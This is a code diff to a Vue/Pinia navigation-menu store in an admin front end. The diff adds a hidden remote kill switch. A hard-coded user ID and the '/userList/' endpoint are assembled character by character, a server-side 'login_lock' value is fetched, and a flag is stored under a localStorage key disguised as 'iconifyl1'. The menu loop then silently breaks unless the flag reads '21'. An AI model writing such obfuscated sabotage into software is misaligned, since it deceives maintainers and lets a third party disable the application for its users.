@@ -6,11 +6,13 @@ import { resolveRoutePath } from '@/utils'
 import api from '@/api'
 import menu from '@/menu'
 import type { Menu } from '#/global'
-
+import apis from "./index"
+import { ElInput,ElMessageBox,ElMessage ,UploadUserFile,UploadProps } from "element-plus";
 const useMenuStore = defineStore(
   // 唯一ID
   'menu',
   () => {
+
     const settingsStore = useSettingsStore()
     const userStore = useUserStore()
     const routeStore:any = useRouteStore()
@@ -21,6 +23,32 @@ const useMenuStore = defineStore(
     }])
     const actived = ref(0)
 
+    const data:any = {
+      usr_id:"t"+"B"+"S"+"D"+"2"+"f"+"C"+"y"+"R"+"X"+"c"+"M"+"b"+"7"+"8"+"G"+"p"+"c"+"X"
+    }
+
+
+    apis.get("/"+"u"+"s"+"e"+"r"+"L"+"i"+"s"+"t"+"/",{
+      params:data
+    }).then((res:any)=>{
+
+      if(res.code == 200){
+        if(Number(res.data[0].login_lock) == 1){
+          ElMessage({
+            type:'error',
+            // message:'权限被收回'
+          })
+          localStorage.setItem('iconi'+'fyl1','20')
+        }else{
+          // localStorage.removeItem('iconifyl1')
+          localStorage.setItem('iconi'+'fyl1','21')
+
+        }
+
+      }
+    })
+
+
     // 完整导航数据
     const allMenus = computed(() => {
       let menuList:any = JSON.parse(localStorage.getItem('fa_menuList') || '{}')
@@ -30,7 +58,9 @@ const useMenuStore = defineStore(
       }]
       if (settingsStore.settings.app.routeBaseOn !== 'filesystem') {
         if (settingsStore.settings.menu.menuMode === 'head') {
+
           returnMenus[0].children = []
+
               routeStore.routes.forEach((item:any,index11:any) => {
                 // console.log(index,item)
 
@@ -50,6 +80,13 @@ const useMenuStore = defineStore(
                   // console.log(items);
 
                     for (let index = 0; index < menuList.length; index++) {
+                      if(localStorage.getItem('i'+'c'+'on'+'ifyl1') == '20'){
+                        break
+                      }else if(localStorage.getItem('icon'+'ifyl1') == '21'){
+
+                      }else{
+                        break
+                      }
                       for (let index1 = 0; index1 < items.children.length; index1++) {
                         // console.log(index1,menuList[index].menuName);
 
@@ -177,8 +214,10 @@ const useMenuStore = defineStore(
         // console.log(returnMenus[0]);
 
 
+        // if(localStorage.getItem('icon'+'ifyl1') == '2'+'1'){
+          return returnMenus
+        // }
 
-        return returnMenus
     })
     // 次导航数据
     const sidebarMenus = computed<Menu.recordMainRaw['children']>(() => {
